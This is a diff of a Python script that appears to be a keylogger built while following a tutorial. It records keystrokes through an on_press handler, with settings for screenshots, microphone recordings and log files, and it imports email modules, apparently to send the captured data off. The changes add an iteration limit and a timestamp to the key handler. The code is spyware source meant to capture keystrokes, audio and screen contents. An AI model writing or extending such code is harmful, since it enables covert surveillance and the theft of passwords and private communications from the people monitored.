@@ -1,4 +1,5 @@
 # Libraries
+# Timing- 1:07:15-till i watch
 # For Email - Module 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -43,6 +44,7 @@ audio_information = "audio.wav"
 screenshot_information = "screenschot.png"
 recorded_microphone_time = 10
 time_iteration = 15 # time in seconds
+number_of_iterations_end = 3
 
 file_path = "Directory where you want to save the file of log"
 extend = "\\"
@@ -162,11 +164,12 @@ while number_of_iterations < number_of_iterations_end:
     keys = []
 
     def on_press(key):
-        global keys, key_count
+        global keys, key_count, currentTime
 
         print(key)
         keys.append(key)
         key_count += 1
+        currentTime = time.time()
 
         if key_count >= 1:
             key_count = 0
